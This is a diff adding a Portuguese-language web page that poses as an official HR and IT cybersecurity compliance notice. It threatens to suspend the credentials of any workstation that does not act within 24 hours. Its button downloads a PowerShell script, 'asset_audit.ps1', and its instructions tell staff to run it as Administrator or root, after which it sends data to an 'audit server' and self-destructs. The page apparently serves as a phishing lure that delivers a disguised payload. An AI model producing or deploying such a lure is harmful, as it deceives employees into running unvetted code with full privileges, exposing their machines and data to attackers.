@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auditoria de Conformidade - RH</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            min-height: 100vh;
+        }
+        .header {
+            background-color: white;
+            border-bottom: 4px solid #1e3a8a;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            padding: 2rem;
+        }
+        .header-content {
+            max-width: 4rem;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+        .logo {
+            width: 4rem;
+            height: 4rem;
+            background-color: #1e3a8a;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2rem;
+        }
+        .header-text h1 {
+            font-size: 1.5rem;
+            color: #1f2937;
+            font-weight: bold;
+        }
+        .header-text p {
+            color: #6b7280;
+            font-size: 0.875rem;
+        }
+        .main-content {
+            max-width: 4rem;
+            margin: 3rem auto;
+            padding: 0 1.5rem;
+        }
+        .alert-box {
+            background-color: #fef2f2;
+            border-left: 4px solid #dc2626;
+            padding: 1.5rem;
+            margin-bottom: 2rem;
+            border-radius: 0.5rem;
+        }
+        .alert-box h2 {
+            color: #991b1b;
+            font-size: 1.25rem;
+            font-weight: bold;
+            margin-bottom: 1rem;
+        }
+        .alert-box p {
+            color: #b91c1c;
+            line-height: 1.6;
+            margin-bottom: 0.5rem;
+        }
+        .button-container {
+            text-align: center;
+            padding: 2rem 0;
+        }
+        .download-button {
+            background-color: #1e3a8a;
+            color: white;
+            font-weight: bold;
+            font-size: 1.125rem;
+            padding: 1rem 2rem;
+            border: none;
+            border-radius: 0.5rem;
+            cursor: pointer;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            transition: background-color 0.2s;
+        }
+        .download-button:hover {
+            background-color: #1e40af;
+        }
+        .download-button:disabled {
+            background-color: #9ca3af;
+            cursor: not-allowed;
+        }
+        .instructions {
+            border-top: 1px solid #e5e7eb;
+            padding-top: 1.5rem;
+            margin-top: 2rem;
+        }
+        .instructions h3 {
+            font-weight: bold;
+            color: #1f2937;
+            margin-bottom: 1rem;
+        }
+        .instructions ol {
+            color: #6b7280;
+            padding-left: 1.5rem;
+        }
+        .instructions li {
+            margin-bottom: 0.5rem;
+            line-height: 1.5;
+        }
+        .footer {
+            text-align: center;
+            color: #9ca3af;
+            font-size: 0.875rem;
+            margin-top: 3rem;
+            padding: 1rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="header-content" style="max-width: 64rem;">
+            <div class="logo">🛡️</div>
+            <div class="header-text">
+                <h1>Setor de Recursos Humanos & TI</h1>
+                <p>Departamento de Segurança Cibernética</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="main-content" style="max-width: 64rem;">
+        <div class="alert-box">
+            <h2>COMUNICADO OFICIAL</h2>
+            <p>Este é um sistema automatizado de inventário e conformidade cibernética.</p>
+            <p>Em conformidade com as diretivas de segurança da instituição, todas as estações de trabalho devem executar a ferramenta de verificação local nas próximas 24 horas.</p>
+            <p>As máquinas que não realizarem a validação até o término do prazo serão identificadas como ativos não autorizados (Shadow IT) e terão suas credenciais e acessos suspensos automaticamente no switch/roteador central da empresa.</p>
+        </div>
+
+        <div class="button-container">
+            <button id="downloadButton" class="download-button" onclick="downloadScript()">
+                INICIAR VERIFICAÇÃO DE CONFORMIDADE DE HARDWARE
+            </button>
+        </div>
+
+        <div class="instructions">
+            <h3>Instruções:</h3>
+            <ol>
+                <li>Clique no botão acima para baixar o script de verificação</li>
+                <li>Execute o script como Administrador (Windows) ou root (Linux)</li>
+                <li>O script coletará informações de hardware e rede automaticamente</li>
+                <li>Os dados serão enviados diretamente para o servidor de auditoria</li>
+                <li>O script se autodestruirá após o envio bem-sucedido</li>
+            </ol>
+        </div>
+    </div>
+
+    <div class="footer">
+        <p>Para suporte técnico, contate o departamento de TI</p>
+        <p>© <span id="year"></span> - Sistema de Auditoria Corporativa</p>
+    </div>
+
+    <script>
+        document.getElementById('year').textContent = new Date().getFullYear();
+
+        async function downloadScript() {
+            const button = document.getElementById('downloadButton');
+            button.disabled = true;
+            button.textContent = 'Download Iniciado...';
+
+            try {
+                const response = await fetch('/api/v1/assets/download/powershell');
+                if (response.ok) {
+                    const blob = await response.blob();
+                    const url = URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = 'asset_audit.ps1';
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                    URL.revokeObjectURL(url);
+                }
+            } catch (error) {
+                console.error('Erro ao baixar script:', error);
+                button.disabled = false;
+                button.textContent = 'INICIAR VERIFICAÇÃO DE CONFORMIDADE DE HARDWARE';
+            }
+        }
+    </script>
+</body>
+</html>
